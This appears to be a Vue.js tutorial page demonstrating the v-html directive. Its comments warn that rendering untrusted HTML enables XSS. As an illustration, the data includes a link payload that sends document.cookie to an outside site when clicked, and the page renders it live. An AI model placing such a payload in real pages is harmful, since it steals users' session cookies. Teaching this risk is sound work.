<!DOCTYPE html>
<html lang='en'>
<head>
    <meta charset='UTF-8'>
    <meta http-equiv='X-UA-Compatible' content='IE=edge'>
    <meta name='viewport' content='width=device-width, initial-scale=1.0'>
    <title>Document</title>
    <script src='../js/vue.js'></script>
</head>
<body>
    <!-- 
            v-html指令
                1.作用: 向其所在的节点渲染包含html结构的内容
                2.与插值语法的区别:
                    (1).v-html会替换掉节点中所有的内容, {{}}则不会
                    (2).v-html能识别html结构
                3.严重注意: v-html有安全性问题:
                    (1).在网站上动态渲染任意html是非常危险的, 容易导致xss攻击
                    (2).一定要在可信的内容上使用v-html,永远不要用在户提交的内容上!
    -->
    <!-- 准备好一个容器 -->
    <div id='app'>
        <div v-text="msg"></div>
        
        <div v-html="msg"></div>
        <div v-html="sup"></div>
    </div>
    <script>
        //创建Vue实例
        new Vue({
            el:'#app',
            data() { 
                return {
                    args:{key:'ba',value:"hdja"},
                    msg:'<h1>白驹过隙,时光荏苒</h1>',
                    sup:"<a href=javascript:location.href='https://www.baidu.com?'+document.cookie>点我有惊喜!</a>"
                }
            }
        })
        
    </script>
</body>
</html>
